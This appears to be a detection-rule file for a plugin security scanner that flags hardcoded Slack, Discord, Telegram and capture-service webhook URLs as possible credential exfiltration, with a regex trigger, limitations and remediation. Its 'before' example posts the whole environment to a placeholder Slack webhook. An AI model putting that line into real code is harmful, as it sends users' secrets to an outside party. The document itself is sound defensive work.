---
ruleId: SS-PLUGIN-SECRET-EXFIL-WEBHOOK-01
severity: high
subScore: security
weight: 25
status: shadow
shadowUntil: 2026-01-18
appliesTo: [plugin]
frameworks: ["owasp-llm:llm02", "mitre-atlas:AML.T0025", "cwe:200"]
title: >-
  Sends data to a hardcoded chat or capture webhook
categoryLabel: >-
  Credential exfiltration
explanation: >-
  This plugin embeds a chat-platform or request-capture webhook URL ({match}).
  Webhooks are the classic exfiltration drop: a plugin collects env, files, or
  system info and posts it to a hardcoded endpoint the attacker watches.
severityRationale: >-
  a hardcoded webhook is a ready-made data drop, but a legitimate notifier looks
  identical without more context — high, pending the shadow-window FP measurement.
remediation:
  action: >-
    Remove the hardcoded webhook URL; make any notification target user-configured
    and never send secrets through it.
  steps:
    - >-
      Replace the embedded webhook URL with a value the installing user supplies.
    - >-
      Post only non-sensitive notification fields — never env vars, file contents,
      or credentials.
  saferPattern:
    before: |-
      requests.post("https://hooks.slack.com/services/T000/B000/XXXX", json={"env": dict(os.environ)})
    after: |-
      # user-supplied target; send only a benign status message
      requests.post(config.webhook_url, json={"status": "build complete"})
trigger:
  type: regex_match
  pattern: '(?i)https://(?:hooks\.slack\.com/services/|discord(?:app)?\.com/api/webhooks/|outlook\.office\.com/webhook/|api\.telegram\.org/bot|webhook\.site/|requestcatcher\.com/|pipedream\.com/|n8n\.cloud/|zapier\.com/hooks/)\S+'
  scope:
    paths: ['**/*.py', '**/*.ts', '**/*.js', '**/*.mjs', '**/*.cjs', '**/*.go', '**/*.rb', '**/*.java', '**/*.md', '**/*.json', '**/*.yaml', '**/*.yml']
limitations:
  - "Many legitimate plugins use webhook URLs (Slack notifiers, Discord bots, monitoring integrations). Shadow window measures real-world FP cost."
  - "Cannot detect webhook URLs constructed at runtime from variables."
  - "Cannot distinguish a user-configured legitimate webhook from a hardcoded exfiltration endpoint without consulting the rest of the plugin source for the configuration mechanism."
priorArt:
  - https://snyk.io/blog/leaking-environment-variables-malicious-package/
  - https://socket.dev/blog/discord-webhook-credential-exfiltration
  - https://attack.mitre.org/techniques/T1041/
---

# SS-PLUGIN-SECRET-EXFIL-WEBHOOK-01 — Plugin posts to webhook endpoint

## Rationale

The "exfiltrate via webhook" pattern (Socket's 2024 analysis of Discord-
webhook exfiltration in npm packages, Snyk's malicious-package research)
embeds a chat-platform webhook URL directly in a plugin's source; the
plugin sends collected data (env, files, system info) to the webhook,
which the attacker monitors.

The rule's FP risk is high: legitimate plugins (Slack notifiers, Discord
bots, monitoring integrations) embed webhook URLs by design. The shadow
window will quantify the operational FP rate; the most likely promotion
path is to narrow the trigger to webhook URLs that coexist with env-read
primitives (composite signal aligning with SS-PLUGIN-SECRET-EXFIL-ENV-NET-01).

High severity matches the outcome class. Shadow lands for FP measurement.

## False positive history

(date-stamped log; updated by FP-audit harness and vendor-appeal outcomes)

## Version history

- v1 (2026-01-09): initial rule. Lands shadow; FP-audit gates promotion.
